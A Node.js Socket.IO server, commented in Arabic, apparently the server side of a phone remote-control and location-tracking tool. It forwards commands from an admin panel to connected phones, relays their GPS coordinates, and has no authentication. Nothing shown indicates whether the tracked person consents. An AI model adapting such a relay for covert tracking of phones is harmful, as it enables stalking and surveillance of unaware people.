const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

// توجيه المتصفح لفتح صفحة التحكم
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// التعامل مع الاتصالات
io.on('connection', (socket) => {
    console.log('متصل جديد: ' + socket.id);

    // استقبال الأوامر من لوحة التحكم وإرسالها للموبايل
    socket.on('admin_command', (data) => {
        console.log('إرسال أمر للموبايل:', data.command);
        io.emit(data.command, { id: Date.now() });
    });

    // استقبال الإحداثيات من الموبايل
    socket.on('location_update', (data) => {
        console.log('وصلت إحداثيات جديدة:', data);
        io.emit('display_location', data);
    });

    socket.on('disconnect', () => {
        console.log('جهاز قطع الاتصال');
    });
});

// تشغيل السيرفر على بورت 3000 (المناسب لـ Replit)
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`السيرفر شغال على الرابط المباشر بورت ${PORT}`);
});
